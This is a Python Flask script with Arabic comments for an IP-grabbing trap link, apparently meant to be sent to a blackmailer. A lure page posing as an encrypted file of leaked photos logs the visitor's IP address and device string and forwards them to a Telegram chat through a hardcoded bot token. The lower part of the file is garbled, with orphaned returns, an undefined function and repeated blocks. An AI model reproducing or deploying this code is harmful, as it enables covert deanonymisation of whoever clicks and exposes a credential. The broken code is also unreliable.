import os
import io
from flask import Flask, request, send_file, render_template_string
import telebot

# --- بياناتك السرية ---
TOKEN = "8444429563:AAEZL3LwcSp50Bx_CgL46g5KnXmC8NjAtxw"
CHAT_ID = "5775781038"
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

def get_real_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

@app.route('/')
def health_check():
    return "System Status: Online 💀"

# هذا هو الرابط الذي سترسله للمبتز
@app.route('/view_photo')
def trap_page():
    ip = get_real_ip()
    ua = request.headers.get('User-Agent', 'Unknown')
    
    # إرسال البيانات فوراً لتليجرام
    log_msg = (
        f"🎯 **تم صيد المبتز بنجاح!**\n\n"
        f"🌐 **IP:** `{ip}`\n"
        f"📱 **الجهاز:** `{ua[:100]}`\n"
        f"⏰ **الوقت:** تم الدخول الآن"
    )
    bot.send_message(CHAT_ID, log_msg, parse_mode="Markdown")
    
    # صفحة تظهر للمبتز وتجبر التطبيقات على إظهار معاينة احترافية
    return render_template_string('''
    <html><head>
    <title>جاري تحميل الملف...</title>
    <meta property="og:title" content="ملف صور مسربة - حماية عالية">
    <meta property="og:description" content="إضغط لفتح الملف المشفر">
    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/337/337948.png">
    <meta property="og:type" content="article">
    <script>
        setTimeout(function(){
            window.location.href = "https://www.google.com";
        }, 2000);
    </script>
    </head>
    <body style="background-color: #000; color: #fff; text-align: center; padding-top: 50px; font-family: sans-serif;">
        <h2>جاري فك تشفير الملف...</h2>
        <p>يرجى الانتظار ثواني قليلة</p>
    </body></html>
    ''')

if __name__ == "__main__":
    # تشغيل السيرفر على البورت الذي تحدده الاستضافة
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    ip = get_victim_ip()
    bot.send_message(CHAT_ID, f"📸 **معاينة تلقائية من جهازه!**\n🌐 IP: `{ip}`")
    img = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n\x2d\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
    return send_file(io.BytesIO(img), mimetype='image/jpeg')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    return send_file(io.BytesIO(img), mimetype='image/jpeg')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
